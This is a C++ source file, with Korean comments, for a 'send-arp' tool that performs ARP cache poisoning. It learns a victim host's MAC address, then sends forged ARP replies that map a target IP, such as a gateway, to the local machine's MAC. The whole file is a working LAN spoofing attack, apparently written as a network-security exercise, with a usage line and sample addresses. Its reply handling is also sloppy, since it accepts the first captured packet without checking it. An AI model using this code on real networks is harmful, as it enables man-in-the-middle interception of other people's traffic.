#include <stdio.h>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <net/if.h>

// 패킷 구조를 정의하기 위한 구조체 선언
#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;  // 이더넷 헤더
	ArpHdr arp_;  // ARP 헤더
};
#pragma pack(pop)

// 로컬 장치의 IP와 MAC 주소를 가져오는 함수
void get_local_info(char *device, char *device_ip, char *device_mac) {
    int socket_descriptor;
    struct ifreq device_info;

    // 소켓을 생성
    socket_descriptor = socket(AF_INET, SOCK_DGRAM, 0);
    if (socket_descriptor < 0) {
        perror("Error opening socket");
        exit(EXIT_FAILURE);
    }

    // 장치 이름 복사
    strncpy(device_info.ifr_name, device, IFNAMSIZ - 1);

    // MAC 주소를 가져오기 위한 ioctl 호출
    if (ioctl(socket_descriptor, SIOCGIFHWADDR, &device_info) == -1) {
        perror("Error fetching MAC address");
        close(socket_descriptor);
        exit(EXIT_FAILURE);
    }

    // MAC 주소를 문자열 형태로 변환
    snprintf(device_mac, 18, "%02X:%02X:%02X:%02X:%02X:%02X",
        (unsigned char)device_info.ifr_hwaddr.sa_data[0],
        (unsigned char)device_info.ifr_hwaddr.sa_data[1],
        (unsigned char)device_info.ifr_hwaddr.sa_data[2],
        (unsigned char)device_info.ifr_hwaddr.sa_data[3],
        (unsigned char)device_info.ifr_hwaddr.sa_data[4],
        (unsigned char)device_info.ifr_hwaddr.sa_data[5]);

    // IP 주소를 가져오기 위한 ioctl 호출
    if (ioctl(socket_descriptor, SIOCGIFADDR, &device_info) == -1) {
        perror("Error fetching IP address");
        close(socket_descriptor);
        exit(EXIT_FAILURE);
    }

    // IP 주소를 문자열 형태로 변환
    strncpy(device_ip, inet_ntoa(((struct sockaddr_in*)&device_info.ifr_addr)->sin_addr), INET_ADDRSTRLEN);

    close(socket_descriptor);
}

// ARP 요청 패킷을 생성하는 함수
EthArpPacket make_arp_request_packet(char* local_mac, char* local_ip, char* sender_ip) {
    EthArpPacket packet;

    // 패킷 필드 설정
    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");  // dest MAC 주소 (브로드캐스트)
    packet.eth_.smac_ = Mac(local_mac);            // src MAC 주소
    packet.eth_.type_ = htons(EthHdr::Arp);        // 패킷 타입: ARP

    // ARP 헤더 설정
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);       // 하드웨어 타입: 이더넷
    packet.arp_.pro_ = htons(EthHdr::Ip4);         // 프로토콜 타입: IPv4
    packet.arp_.hln_ = Mac::SIZE;                  // MAC 주소 길이
    packet.arp_.pln_ = Ip::SIZE;                   // IP 주소 길이
    packet.arp_.op_ = htons(ArpHdr::Request);      // 연산 코드: ARP 요청
    packet.arp_.smac_ = Mac(local_mac);            // src MAC 주소
    packet.arp_.sip_ = htonl(Ip(local_ip));        // src IP 주소
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");  // target MAC 주소 (알려지지 않음)
    packet.arp_.tip_ = htonl(Ip(sender_ip));       // target IP 주소

    return packet;
}

// ARP 응답 패킷을 생성하는 함수
EthArpPacket make_arp_reply_packet(char* local_mac, char* sender_ip, char* target_ip, Mac target_mac) {
    EthArpPacket packet;

    // 패킷 필드 설정
    packet.eth_.dmac_ = target_mac;                // dest MAC 주소
    packet.eth_.smac_ = Mac(local_mac);            // src MAC 주소
    packet.eth_.type_ = htons(EthHdr::Arp);        // 패킷 타입: ARP

    // ARP 헤더 설정
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);       // 하드웨어 타입: 이더넷
    packet.arp_.pro_ = htons(EthHdr::Ip4);         // 프로토콜 타입: IPv4
    packet.arp_.hln_ = Mac::SIZE;                  // MAC 주소 길이
    packet.arp_.pln_ = Ip::SIZE;                   // IP 주소 길이
    packet.arp_.op_ = htons(ArpHdr::Reply);        // 연산 코드: ARP 응답
    packet.arp_.smac_ = Mac(local_mac);            // src MAC 주소
    packet.arp_.sip_ = htonl(Ip(target_ip));       // src IP 주소
    packet.arp_.tmac_ = target_mac;                // target MAC 주소
    packet.arp_.tip_ = htonl(Ip(sender_ip));       // target IP 주소

    return packet;
}

// ARP 패킷을 전송하는 함수
void send_arp(char *dev, char *sender_ip, char *target_ip, char *local_ip, char *local_mac) {
    char errbuf[PCAP_ERRBUF_SIZE];

    // 지정된 인터페이스로 패킷 캡처를 시작
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (!handle) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        exit(-1);
    }

    // ARP 요청 패킷 생성 및 전송
    EthArpPacket request_packet = make_arp_request_packet(local_mac, local_ip, sender_ip);
    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&request_packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    // 응답 패킷을 기다림
    pcap_pkthdr* header;
    const u_char* response_packet;
    res = pcap_next_ex(handle, &header, &response_packet);
    if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
        fprintf(stderr, "pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
        exit(-1);
    }

    // 응답 패킷의 정보를 사용하여 ARP 응답 패킷을 생성 및 전송
    EthArpPacket *recv_packet = (EthArpPacket*)response_packet;
    EthArpPacket reply_packet = make_arp_reply_packet(local_mac, sender_ip, target_ip, recv_packet->eth_.smac_);

    res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&reply_packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    // 결과 출력
    printf("\nARP Packet Sent!\n");
    printf("Sender IP: %s\nTarget IP: %s\n", sender_ip, target_ip);

    pcap_close(handle);
}

int main(int argc, char* argv[]) {
    // 사용자 입력 검증
    if (argc < 4 || argc & 1) {
        printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\nsample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
	return -1;
    }

    // 로컬 장치의 IP와 MAC 주소를 가져옴
    char local_ip[INET_ADDRSTRLEN];
    char local_mac[18];
    get_local_info(argv[1], local_ip, local_mac);

    // 각각의 IP 쌍에 대하여 실행
    for (int i = 2; i < argc; i = i+2) {
        send_arp(argv[1], argv[i], argv[i+1], local_ip, local_mac);
    }

    return 0;
}

